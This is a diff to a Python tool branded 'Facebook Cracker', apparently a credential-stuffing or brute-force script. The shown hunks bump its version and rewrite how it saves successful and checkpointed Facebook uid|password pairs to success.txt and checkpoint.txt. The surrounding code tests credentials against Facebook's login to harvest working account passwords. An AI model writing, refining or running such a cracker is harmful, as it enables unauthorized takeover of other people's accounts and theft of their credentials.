@@ -43,7 +43,7 @@ logo = f"""
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {Y}Developer : Abd Ur Rab
 {Y}Tool Name : Facebook Cracker
-{Y}Version   : 5.0 (Fixed)
+{Y}Version   : 6.0 (Fixed Errors)
 {Y}Status    : Active
 {Y}Date      : {current_date}
 {Y}Time      : {current_time}
@@ -100,11 +100,13 @@ def facebook_login(uid, password, total, completed):
         if "session_key" in response:
             print(f"{G}[SUCCESS] {uid} | {password}")
             logging.info(f"Success: {uid} | {password}")
-            open("success.txt", "a").write(uid + "|" + password + "\n")
+            with open("success.txt", "a") as f:
+                f.write(f"{uid}|{password}\n")
         elif "www.facebook.com" in response.get("error_msg", ""):
             print(f"{Y}[CHECKPOINT] {uid} | {password}")
             logging.warning(f"Checkpoint: {uid} | {password}")
-            open("checkpoint.txt", "a").write(uid + "|" + password + "\n")
+            with open("checkpoint.txt", "a") as f:
+                f.write(f"{uid}|{password}\n")
         else:
             print(f"{R}[FAILED] {uid} | {password}")
             logging.error(f"Failed: {uid} | {password}")
